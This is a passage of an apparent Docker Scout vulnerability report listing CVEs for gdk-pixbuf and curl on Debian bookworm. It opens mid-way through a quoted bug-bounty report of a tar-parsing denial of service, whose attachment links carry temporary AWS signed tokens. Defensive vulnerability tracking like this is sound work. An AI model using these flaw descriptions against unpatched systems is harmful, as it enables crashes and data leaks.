GrUspqQZb5TAKlUge7iOZEc2TZ5uagatSy9Mg08E4nImBSE5QUHDc7Daya1gyqrETMDZBBUHH2RFkGA9qMpEtNrtJ9G%2BPedz%2FpPY1hh9OCp9Pg1BrX97l3SfVzlAMRfNibhywq6qnE35rVnZi%2BEQ1UgBjs9jD%2FQrW49%2FaD0oUDojVeuFFryzRnQxDbKtYgonRcItTvLT5Y0xaK9P0u6H1197%2FMk3XxmjD9%2Fb%2BvBjqxAQWWkKiIxpC1oHEWK9Jt8UdJ39xszDBGpBqjB6Tvt5ePAXSyX8np%2FrBi%2BAPx06O0%2Ba7pU4NmH800EVXxxhgfj9nMw3CeoUIdxorVKtU2Mxw%2FLaAiPgxPS4rqkt65NF7eQYfegcSYDTm2Z%2BHPbz9HfCaVZ28Zqeko6sR%2F29ML4bguqVvHAM4mWPLNDXH33mjG%2BuzLi8e1BF7tNveg2X9G%2FRdcMkojwKYbu6xN3M6aX2alQg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1e8235d885f1d61529b7d6b23ea3a0780c300c91d86e925dd8310d5b661ddbe2) show-casing the exploit: 

## Impact

Denial of service by crashing the nodejs client when attempting to parse a tar archive, make it run out of heap memory and consuming server CPU and memory resources

## Report resources
[payload.txt](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1e83ayb5dd3350fvj3gst0mqixwk?response-content-disposition=attachment%3B%20filename%3D%22payload.txt%22%3B%20filename%2A%3DUTF-8%27%27payload.txt&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSWWGDXHA%2F20240312%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240312T080103Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCID3xYDc6emXVPOg8iVR5dVk0u3gguTPIDJ0OIE%2BKxj17AiEAi%2BGiay1gGMWhH%2F031fvMYnSsa8U7CnpZpxvFAYqNRwgqsQUIQBADGgwwMTM2MTkyNzQ4NDkiDAaj6OgUL3gg4hhLLCqOBUUrOgWSqaK%2FmxN6nKRvB4Who3LIyzswFKm9LV94GiSVFP3zXYA480voCmAHTg7eBL7%2BrYgV2RtXbhF4aCFMCN3qu7GeXkIdH7xwVMi9zXHkekviSKZ%2FsZtVVjn7RFqOCKhJl%2FCoiLQJuDuju%2FtfdTGZbEbGsPgKHoILYbRp81K51zeRL21okjsOehmypkZzq%2BoGrXIX0ynPOKujxw27uqdF4T%2BF9ynodq01vGgwgVBEjHojc4OKOfr1oW5b%2FtGVV59%2BOBVI1hqIKHRG0Ed4SWmp%2BLd1hazGuZPvp52szmegnOj5qr3ubppnKL242bX%2FuAnQKzKK0HpwolqXjsuEeFeM85lxhqHV%2B1BJqaqSHHDa0HUMLZistMRshRlntuchcFQCR6HBa2c8PSnhpVC31zMzvYMfKsI12h4HB6l%2FudrmNrvmH4LmNpi4dZFcio21DzKj%2FRjWmxjH7l8egDyG%2FIgPMY6Ls4IiN7aR1jijYTrBCgPUUHets3BFvqLzHtPFnG3B7%2FYRPnhCLu%2FgzvKN3F8l38KqeTNMHJaxkuhCvEjpFB2SJbi2QZqZZbLj3xASqXoogzbsyPp0Tzp0tH7EKDhPA7H6wwiZukXfFhhlYzP8on9fO2Ajz%2F%2BTDkDjbfWw4KNJ0cFeDsGrUspqQZb5TAKlUge7iOZEc2TZ5uagatSy9Mg08E4nImBSE5QUHDc7Daya1gyqrETMDZBBUHH2RFkGA9qMpEtNrtJ9G%2BPedz%2FpPY1hh9OCp9Pg1BrX97l3SfVzlAMRfNibhywq6qnE35rVnZi%2BEQ1UgBjs9jD%2FQrW49%2FaD0oUDojVeuFFryzRnQxDbKtYgonRcItTvLT5Y0xaK9P0u6H1197%2FMk3XxmjD9%2Fb%2BvBjqxAQWWkKiIxpC1oHEWK9Jt8UdJ39xszDBGpBqjB6Tvt5ePAXSyX8np%2FrBi%2BAPx06O0%2Ba7pU4NmH800EVXxxhgfj9nMw3CeoUIdxorVKtU2Mxw%2FLaAiPgxPS4rqkt65NF7eQYfegcSYDTm2Z%2BHPbz9HfCaVZ28Zqeko6sR%2F29ML4bguqVvHAM4mWPLNDXH33mjG%2BuzLi8e1BF7tNveg2X9G%2FRdcMkojwKYbu6xN3M6aX2alQg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bad9fe731f05a63a950f99828125653a8c1254750fe0ca7be882e89ecdd449ae)
[archeive.tar.gz](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ymkuh4xnfdcf1soeyi7jc2x4yt2i?response-content-disposition=attachment%3B%20filename%3D%22archive.tar.gz%22%3B%20filename%2A%3DUTF-8%27%27archive.tar.gz&response-content-type=application%2Fx-tar&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSWWGDXHA%2F20240312%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240312T080103Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDcaCXVzLXdlc3QtMiJHMEUCID3xYDc6emXVPOg8iVR5dVk0u3gguTPIDJ0OIE%2BKxj17AiEAi%2BGiay1gGMWhH%2F031fvMYnSsa8U7CnpZpxvFAYqNRwgqsQUIQBADGgwwMTM2MTkyNzQ4NDkiDAaj6OgUL3gg4hhLLCqOBUUrOgWSqaK%2FmxN6nKRvB4Who3LIyzswFKm9LV94GiSVFP3zXYA480voCmAHTg7eBL7%2BrYgV2RtXbhF4aCFMCN3qu7GeXkIdH7xwVMi9zXHkekviSKZ%2FsZtVVjn7RFqOCKhJl%2FCoiLQJuDuju%2FtfdTGZbEbGsPgKHoILYbRp81K51zeRL21okjsOehmypkZzq%2BoGrXIX0ynPOKujxw27uqdF4T%2BF9ynodq01vGgwgVBEjHojc4OKOfr1oW5b%2FtGVV59%2BOBVI1hqIKHRG0Ed4SWmp%2BLd1hazGuZPvp52szmegnOj5qr3ubppnKL242bX%2FuAnQKzKK0HpwolqXjsuEeFeM85lxhqHV%2B1BJqaqSHHDa0HUMLZistMRshRlntuchcFQCR6HBa2c8PSnhpVC31zMzvYMfKsI12h4HB6l%2FudrmNrvmH4LmNpi4dZFcio21DzKj%2FRjWmxjH7l8egDyG%2FIgPMY6Ls4IiN7aR1jijYTrBCgPUUHets3BFvqLzHtPFnG3B7%2FYRPnhCLu%2FgzvKN3F8l38KqeTNMHJaxkuhCvEjpFB2SJbi2QZqZZbLj3xASqXoogzbsyPp0Tzp0tH7EKDhPA7H6wwiZukXfFhhlYzP8on9fO2Ajz%2F%2BTDkDjbfWw4KNJ0cFeDsGrUspqQZb5TAKlUge7iOZEc2TZ5uagatSy9Mg08E4nImBSE5QUHDc7Daya1gyqrETMDZBBUHH2RFkGA9qMpEtNrtJ9G%2BPedz%2FpPY1hh9OCp9Pg1BrX97l3SfVzlAMRfNibhywq6qnE35rVnZi%2BEQ1UgBjs9jD%2FQrW49%2FaD0oUDojVeuFFryzRnQxDbKtYgonRcItTvLT5Y0xaK9P0u6H1197%2FMk3XxmjD9%2Fb%2BvBjqxAQWWkKiIxpC1oHEWK9Jt8UdJ39xszDBGpBqjB6Tvt5ePAXSyX8np%2FrBi%2BAPx06O0%2Ba7pU4NmH800EVXxxhgfj9nMw3CeoUIdxorVKtU2Mxw%2FLaAiPgxPS4rqkt65NF7eQYfegcSYDTm2Z%2BHPbz9HfCaVZ28Zqeko6sR%2F29ML4bguqVvHAM4mWPLNDXH33mjG%2BuzLi8e1BF7tNveg2X9G%2FRdcMkojwKYbu6xN3M6aX2alQg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5e2c0d4b4de40373ac0fe91908c2659141a6dd4ab850271cc26042a3885c82ea)

## Note
This report was originally reported to GitHub bug bounty program, they asked me to report it to you a month ago

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>gdk-pixbuf</strong> <code>2.42.10+dfsg-1</code> (deb)</summary>

<small><code>pkg:deb/debian/gdk-pixbuf@2.42.10%2Bdfsg-1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2022-48622?s=debian&n=gdk-pixbuf&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.42.10%2Bdfsg-1%2Bdeb12u1"><img alt="high : CVE--2022--48622" src="https://img.shields.io/badge/CVE--2022--48622-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.42.10+dfsg-1+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>2.42.10+dfsg-1+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.077%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>23rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In GNOME GdkPixbuf (aka gdk-pixbuf) through 2.42.10, the ANI (Windows animated cursor) decoder encounters heap memory corruption (in ani_load_chunk in io-ani.c) when parsing chunks in a crafted .ani file. A crafted file could allow an attacker to overwrite heap metadata, leading to a denial of service or code execution attack. This occurs in gdk_pixbuf_set_option() in gdk-pixbuf.c.

---
- gdk-pixbuf 2.42.12+dfsg-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1071265)
[bookworm] - gdk-pixbuf 2.42.10+dfsg-1+deb12u1
[bullseye] - gdk-pixbuf 2.42.2+dfsg-1+deb11u2
[buster] - gdk-pixbuf <postponed> (Minor issue, recheck when fixed upstream)
https://gitlab.gnome.org/GNOME/gdk-pixbuf/-/issues/202
Fixed by: https://gitlab.gnome.org/GNOME/gdk-pixbuf/-/commit/00c071dd11f723ca608608eef45cb1aa98da89cc (2.42.12)
Further improvements/hardenings:
https://gitlab.gnome.org/GNOME/gdk-pixbuf/-/commit/d52134373594ff76614fb415125b0d1c723ddd56 (2.42.12)
https://gitlab.gnome.org/GNOME/gdk-pixbuf/-/commit/91b8aa5cd8a0eea28acb51f0e121827ca2e7eb78 (2.42.12)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-7345?s=debian&n=gdk-pixbuf&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.42.10%2Bdfsg-1%2Bdeb12u3"><img alt="high : CVE--2025--7345" src="https://img.shields.io/badge/CVE--2025--7345-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.42.10+dfsg-1+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><code>2.42.10+dfsg-1+deb12u3</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.213%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>44th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw exists in gdk‑pixbuf within the gdk_pixbuf__jpeg_image_load_increment function (io-jpeg.c) and in glib’s g_base64_encode_step (glib/gbase64.c). When processing maliciously crafted JPEG images, a heap buffer overflow can occur during Base64 encoding, allowing out-of-bounds reads from heap memory, potentially causing application crashes or arbitrary code execution.

---
- gdk-pixbuf 2.42.12+dfsg-4 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1109262)
[bookworm] - gdk-pixbuf 2.42.10+dfsg-1+deb12u3
https://gitlab.gnome.org/GNOME/gdk-pixbuf/-/issues/249

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-6199?s=debian&n=gdk-pixbuf&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.42.10%2Bdfsg-1%2Bdeb12u2"><img alt="low : CVE--2025--6199" src="https://img.shields.io/badge/CVE--2025--6199-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.42.10+dfsg-1+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>2.42.10+dfsg-1+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.015%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the GIF parser of GdkPixbuf’s LZW decoder. When an invalid symbol is encountered during decompression, the decoder sets the reported output size to the full buffer length rather than the actual number of written bytes. This logic error results in uninitialized sections of the buffer being included in the output, potentially leaking arbitrary memory contents in the processed image.

---
- gdk-pixbuf 2.42.12+dfsg-3 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1107994)
https://bugzilla.redhat.com/show_bug.cgi?id=2373147
https://gitlab.gnome.org/GNOME/gdk-pixbuf/-/issues/257
https://gitlab.gnome.org/GNOME/gdk-pixbuf/-/merge_requests/191
Fixed by: https://gitlab.gnome.org/GNOME/gdk-pixbuf/-/commit/c4986342b241cdc075259565f3fa7a7597d32a32 (2.43.2)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 5" src="https://img.shields.io/badge/M-5-fbb552"/> <img alt="low: 9" src="https://img.shields.io/badge/L-9-fce1a9"/> <!-- unspecified: 0 --><strong>curl</strong> <code>7.88.1-10+deb12u4</code> (deb)</summary>

<small><code>pkg:deb/debian/curl@7.88.1-10%2Bdeb12u4?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-2398?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C7.88.1-10%2Bdeb12u6"><img alt="high : CVE--2024--2398" src="https://img.shields.io/badge/CVE--2024--2398-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><7.88.1-10+deb12u6</code></td></tr>
<tr><td>Fixed version</td><td><code>7.88.1-10+deb12u6</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.962%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>83rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When an application tells libcurl it wants to allow HTTP/2 server push, and the amount of received headers for the push surpasses the maximum allowed limit (1000), libcurl aborts the server push. When aborting, libcurl inadvertently does not free all the previously allocated headers and instead leaks the memory.  Further, this error condition fails silently and is therefore not easily detected by an application.

---
- curl 8.7.1-1
[bookworm] - curl 7.88.1-10+deb12u6
[bullseye] - curl 7.74.0-1.3+deb11u12
[buster] - curl <postponed> (Minor issue; can be fixed in next update)
https://curl.se/docs/CVE-2024-2398.html
Introduced by: https://github.com/curl/curl/commit/ea7134ac874a66107e54ff93657ac565cf2ec4aa (curl-7_44_0)
Fixed by: https://github.com/curl/curl/commit/deca8039991886a559b67bcd6701db800a5cf764 (curl-8_7_0)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-9681?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C7.88.1-10%2Bdeb12u9"><img alt="medium : CVE--2024--9681" src="https://img.shields.io/badge/CVE--2024--9681-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><7.88.1-10+deb12u9</code></td></tr>
<tr><td>Fixed version</td><td><code>7.88.1-10+deb12u9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.580%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>68th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When curl is asked to use HSTS, the expiry time for a subdomain might overwrite a parent domain's cache entry, making it end sooner or later than otherwise intended.  This affects curl using applications that enable HSTS and use URLs with the insecure `HTTP://` scheme and perform transfers with hosts like `x.example.com` as well as `example.com` where the first host is a subdomain of the second host.  (The HSTS cache either needs to have been populated manually or there needs to have been previous HTTPS accesses done as the cache needs to have entries for the domains involved to trigger this problem.)  When `x.example.com` responds with `Strict-Transport-Security:` headers, this bug can make the subdomain's expiry timeout *bleed over* and get set for the parent domain `example.com` in curl's HSTS cache.  The result of a triggered bug is that HTTP accesses to `example.com` get converted to HTTPS for a different period of time than what was asked for by the origin server. If `example.com` for example stops supporting HTTPS at its expiry time, curl might then fail to access `http://example.com` until the (wrongly set) timeout expires. This bug can also expire the parent's entry *earlier*, thus making curl inadvertently switch back to insecure HTTP earlier than otherwise intended.

---
- curl 8.11.0-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1086804)
[bookworm] - curl 7.88.1-10+deb12u9
[bullseye] - curl <ignored> (curl is not built with HSTS support)
https://curl.se/docs/CVE-2024-9681.html
Introduced by: https://github.com/curl/curl/commit/7385610d0c74c6a254fea5e4cd6e1d559d848c8c (curl-7_74_0)
Fixed by: https://github.com/curl/curl/commit/a94973805df96269bf3f3bf0a20ccb9887313316 (curl-8_11_0)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-8096?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C7.88.1-10%2Bdeb12u8"><img alt="medium : CVE--2024--8096" src="https://img.shields.io/badge/CVE--2024--8096-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><7.88.1-10+deb12u8</code></td></tr>
<tr><td>Fixed version</td><td><code>7.88.1-10+deb12u8</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.412%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>61st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When curl is told to use the Certificate Status Request TLS extension, often referred to as OCSP stapling, to verify that the server certificate is valid, it might fail to detect some OCSP problems and instead wrongly consider the response as fine.  If the returned status reports another error than 'revoked' (like for example 'unauthorized') it is not treated as a bad certficate.

---
- curl 8.10.0-1
[bookworm] - curl 7.88.1-10+deb12u8
https://curl.se/docs/CVE-2024-8096.html
Introduced with: https://github.com/curl/curl/commit/f13669a375f5bfd14797bda91642cabe076974fa (curl-7_41_0)
Fixed by: https://github.com/curl/curl/commit/aeb1a281cab13c7ba791cb104e556b20e713941f (curl-8_10_0)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-7264?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C7.88.1-10%2Bdeb12u7"><img alt="medium : CVE--2024--7264" src="https://img.shields.io/badge/CVE--2024--7264-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><7.88.1-10+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><code>7.88.1-10+deb12u7</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.924%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>76th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libcurl's ASN1 parser code has the `GTime2str()` function, used for parsing an ASN.1 Generalized Time field. If given an syntactically incorrect field, the parser might end up using -1 for the length of the *time fraction*, leading to a `strlen()` getting performed on a pointer to a heap buffer area that is not (purposely) null terminated.  This flaw most likely leads to a crash, but can also lead to heap contents getting returned to the application when [CURLINFO_CERTINFO](https://curl.se/libcurl/c/CURLINFO_CERTINFO.html) is used.

---
- curl 8.9.1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1077656)
[bookworm] - curl 7.88.1-10+deb12u7
[bullseye] - curl 7.74.0-1.3+deb11u13
https://curl.se/docs/CVE-2024-7264.html
Introduced by: https://github.com/curl/curl/commit/3a24cb7bc456366cbc3a03f7ab6d2576105a1f2d (curl-7_32_0)
Fixed by: https://github.com/curl/curl/commit/27959ecce75cdb2809c0bdb3286e60e08fadb519 (curl-8_9_1)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-46218?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C7.88.1-10%2Bdeb12u5"><img alt="medium : CVE--2023--46218" src="https://img.shields.io/badge/CVE--2023--46218-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><7.88.1-10+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>7.88.1-10+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.432%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>62nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

This flaw allows a malicious HTTP server to set "super cookies" in curl that are then passed back to more origins than what is otherwise allowed or possible. This allows a site to set cookies that then would get sent to different and unrelated sites and domains.  It could do this by exploiting a mixed case flaw in curl's function that verifies a given cookie domain against the Public Suffix List (PSL). For example a cookie could be set with `domain=co.UK` when the URL used a lower case hostname `curl.co.uk`, even though `co.uk` is listed as a PSL domain.

---
- curl 8.5.0-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1057646)
Introduced by: https://github.com/curl/curl/commit/e77b5b7453c1e8ccd7ec0816890d98e2f392e465 (curl-7_46_0)
Fixed by: https://github.com/curl/curl/commit/2b0994c29a721c91c572cff7808c572a24d251eb (curl-8_5_0)
https://curl.se/docs/CVE-2023-46218.html

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-46219?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C7.88.1-10%2Bdeb12u5"><img alt="medium : CVE--2023--46219" src="https://img.shields.io/badge/CVE--2023--46219-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><7.88.1-10+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>7.88.1-10+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.221%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>44th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When saving HSTS data to an excessively long file name, curl could end up removing all contents, making subsequent requests using that file unaware of the HSTS status they should otherwise use.

---
- curl 8.5.0-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1057645)
[bookworm] - curl 7.88.1-10+deb12u5
[bullseye] - curl <ignored> (curl is not built with HSTS support)
[buster] - curl <not-affected> (Not affected by CVE-2022-32207)
Introduced by: https://github.com/curl/curl/commit/20f9dd6bae50b7223171b17ba7798946e74f877f (curl-7_84_0)
The issue is introduced with the fix for CVE-2022-32207.
Fixed by: https://github.com/curl/curl/commit/73b65e94f3531179de45c6f3c836a610e3d0a846 (curl-8_5_0)
https://curl.se/docs/CVE-2023-46219.html

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-15224?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D7.88.1-10%2Bdeb12u14"><img alt="low : CVE--2025--15224" src="https://img.shields.io/badge/CVE--2025--15224-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=7.88.1-10+deb12u14</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.049%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When doing SSH-based transfers using either SCP or SFTP, and asked to do public key authentication, curl would wrongly still ask and authenticate using a locally running SSH agent.

---
- curl 8.18.0-1 (unimportant)
https://curl.se/docs/CVE-2025-15224.html
Introduced with: https://github.com/curl/curl/commit/c92d2e14cfb0db662f958effd2ac86f995cf1b5a (curl-7_58_0)
Fixed by: https://github.com/curl/curl/commit/16d5f2a5660c61cc27bd5f1c7f512391d1c927aa (curl-8_18_0)
Debian builds with libssh2 for SSH backend

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-15079?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D7.88.1-10%2Bdeb12u14"><img alt="low : CVE--2025--15079" src="https://img.shields.io/badge/CVE--2025--15079-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=7.88.1-10+deb12u14</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.021%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When doing SSH-based transfers using either SCP or SFTP, and setting the known_hosts file, libcurl could still mistakenly accept connecting to hosts *not present* in the specified file if they were added as recognized in the libssh *global* known_hosts file.

---
- curl 8.18.0~rc3-1 (unimportant)
https://curl.se/docs/CVE-2025-15079.html
Introduced with: https://github.com/curl/curl/commit/c92d2e14cfb0db662f958effd2ac86f995cf1b5a (curl-7_58_0)
Fixed by: https://github.com/curl/curl/commit/adca486c125d9a6d9565b9607a19dce803a8b479 (rc-8_18_0-3, curl-8_18_0)
Debian builds with libssh2 for SSH backend

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-14017?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D7.88.1-10%2Bdeb12u14"><img alt="low : CVE--2025--14017" src="https://img.shields.io/badge/CVE--2025--14017-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=7.88.1-10+deb12u14</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.007%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When doing multi-threaded LDAPS transfers (LDAP over TLS) with libcurl, changing TLS options in one thread would inadvertently change them globally and therefore possibly also affect other concurrently setup transfers.  Disabling certificate verification for a specific transfer could unintentionally disable the feature for other threads as well.

---
- curl 8.18.0~rc2-1 (unimportant)
https://curl.se/docs/CVE-2025-14017.html
Introduced with: https://github.com/curl/curl/commit/ccba0d10b6baf5c73cae8cf4fb3f29f0f55c5a34 (curl-7_17_0)
Fixed by: https://github.com/curl/curl/commit/39d1976b7f709a516e3243338ebc0443bdd8d56d (rc-8_18_0-1, curl-8_18_0)
Built with OpenLDAP (only affects the legacy LDAP support)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-10966?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D7.88.1-10%2Bdeb12u14"><img alt="low : CVE--2025--10966" src="https://img.shields.io/badge/CVE--2025--10966-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=7.88.1-10+deb12u14</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.015%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

curl's code for managing SSH connections when SFTP was done using the wolfSSH powered backend was flawed and missed host verification mechanisms.  This prevents curl from detecting MITM attackers and more.

---
- curl 8.17.0~rc2-1 (unimportant)
https://curl.se/docs/CVE-2025-10966.html
Introduced with: https://github.com/curl/curl/commit/6773c7ca65cf2183295e56603f9b86a5ce816a06 (curl-7_69_0)
Fixed by: https://github.com/curl/curl/commit/b011e3fcfb06d6c0278595ee2ee297036fbe9793 (rc-8_17_0-1)
wolfSSH backend not used in Debian

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-0725?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D7.88.1-10%2Bdeb12u14"><img alt="low : CVE--2025--0725" src="https://img.shields.io/badge/CVE--2025--0725-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=7.88.1-10+deb12u14</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.904%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>75th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When libcurl is asked to perform automatic gzip decompression of content-encoded HTTP responses with the `CURLOPT_ACCEPT_ENCODING` option, **using zlib 1.2.0.3 or older**, an attacker-controlled integer overflow would make libcurl perform a buffer overflow.

---
- curl 8.12.0+git20250209.89ed161+ds-1 (unimportant)
https://curl.se/docs/CVE-2025-0725.html
Introduced with: https://github.com/curl/curl/commit/019c4088cfcca0d2b7c5cc4f52ca5dac0c616089 (curl-7_10_5)
Fixed by: https://github.com/curl/curl/commit/76f83f0db23846e254d940ec7fe141010077eb88 (curl-8_12_0)
Patch only drops officially support for zlib before 1.2.0.4
Can only be triggered when using ancient runtime zlib of version 1.2.0.3 or older

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-0167?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C7.88.1-10%2Bdeb12u11"><img alt="low : CVE--2025--0167" src="https://img.shields.io/badge/CVE--2025--0167-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><7.88.1-10+deb12u11</code></td></tr>
<tr><td>Fixed version</td><td><code>7.88.1-10+deb12u11</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.173%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>39th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When asked to use a `.netrc` file for credentials **and** to follow HTTP redirects, curl could leak the password used for the first host to the followed-to host under certain circumstances.  This flaw only manifests itself if the netrc file has a `default` entry that omits both login and password. A rare circumstance.

---
- curl 8.12.0+git20250209.89ed161+ds-1
